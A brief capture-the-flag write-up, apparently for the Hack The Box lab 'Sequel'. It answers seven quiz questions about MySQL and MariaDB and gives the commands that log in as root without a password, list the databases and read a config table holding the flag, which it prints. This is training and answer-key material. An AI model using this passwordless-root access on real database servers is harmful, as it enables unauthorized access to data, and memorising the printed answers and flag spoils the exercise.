# Sequel

> Task 1 - What does the acronym SQL stand for? 

```
structured query language
```

> Task 2 - During our scan, which port running mysql do we find? 

```
3306
```

> Task 3 - What community-developed MySQL version is the target running? 

```
mariadb
```

> Task 4 - What switch do we need to use in order to specify a login username for the MySQL service? 

```
-u
```

> Task 5 - Which username allows us to log into MariaDB without providing a password? 

```
root
```

> Task 6 - What symbol can we use to specify within the query that we want to display eveything inside a table? 

```
*
```

> Task 7 - What symbol do we need to end each query with? 

```
;
```

> Submit root flag

```
mysql -h $IP -u root
show databases;
use htb;
show tables;
select * from config;
```

```
HTB{7b4bec00d1a39e3dd4e021ec3d915da8}